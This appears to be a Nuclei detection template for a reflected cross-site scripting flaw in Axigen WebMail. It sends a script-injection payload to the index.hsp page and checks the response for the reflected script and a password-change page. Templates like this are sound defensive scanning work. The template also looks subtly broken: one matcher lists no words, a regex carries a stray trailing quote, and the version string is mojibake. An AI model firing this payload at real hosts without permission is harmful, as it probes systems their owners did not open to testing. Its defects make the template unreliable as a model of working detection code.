id: axigen-reflected-xss

info:
  name: Axigen WebMail Reflected XSS
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template detects a reflected XSS vulnerability in Axigen WebMail versions 10.5.0â€“4370c946 and older. The XSS is triggered via the `index.hsp` page.
  reference:
    - https://www.axigen.com/
    - https://www.exploit-db.com/exploits/51722/

http:
  - raw:
      - |
        GET /index.hsp?m=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
        Host: {{Hostname}}
        
    matchers-condition: and
    matchers:
      - type: word
        part: body
      - type: regex
        regex:
          - "<script>alert(document.domain)</script>'"
          - "<title>Change your password"
        part: body

        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200